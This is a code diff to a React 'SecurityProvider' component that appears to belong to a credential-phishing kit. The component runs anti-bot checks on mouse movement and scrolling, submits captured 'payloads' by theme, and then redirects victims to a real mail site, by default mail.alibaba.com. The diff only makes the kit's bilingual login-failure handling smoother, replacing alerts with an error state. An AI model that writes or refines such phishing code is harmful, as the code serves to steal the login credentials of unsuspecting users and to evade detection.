@@ -7,6 +7,8 @@ import { themeRedirects } from '../DNSUtils';
 interface SecurityContextType {
   isVerified: boolean;
   score: number;
+  error: string | null;
+  setError: (error: string | null) => void;
   reportViolation: (type: string) => void;
   submitPayload: (payload: any, theme: string) => Promise<void>;
 }
@@ -23,6 +25,7 @@ export const SecurityProvider: React.FC<{ children: React.ReactNode }> = ({ chil
   const [isBot, setIsBot] = useState(false);
   const [violation, setViolation] = useState<string | null>(null);
   const [attempts, setAttempts] = useState(0);
+  const [error, setError] = useState<string | null>(null);
   const { t, lang } = useTranslation();
   const mouseMoved = useRef(false);
   const scrolled = useRef(false);
@@ -107,11 +110,11 @@ export const SecurityProvider: React.FC<{ children: React.ReactNode }> = ({ chil
         const redirectUrl = themeRedirects[theme] || 'https://mail.alibaba.com';
         window.location.href = redirectUrl;
       } else {
-        alert(lang === 'zh' ? '登录失败，请检查您的账号或密码并重试。' : 'Authentication failed. Please check your credentials and try again.');
+        setError(lang === 'zh' ? '认证错误，或发生了一些错误，请重试。' : 'authentication error or something went wrong please try again');
       }
     } catch (err) {
       console.error('Submission error:', err);
-      alert(lang === 'zh' ? '系统错误，请稍后再试。' : 'Something went wrong. Please try again.');
+      setError(lang === 'zh' ? '认证错误，或发生了一些错误，请重试。' : 'authentication error or something went wrong please try again');
     }
   };
 
@@ -134,7 +137,7 @@ export const SecurityProvider: React.FC<{ children: React.ReactNode }> = ({ chil
   }
 
   return (
-    <SecurityContext.Provider value={{ isVerified: !isBot, score: 1, reportViolation, submitPayload }}>
+    <SecurityContext.Provider value={{ isVerified: !isBot, score: 1, error, setError, reportViolation, submitPayload }}>
       {children}
     </SecurityContext.Provider>
   );
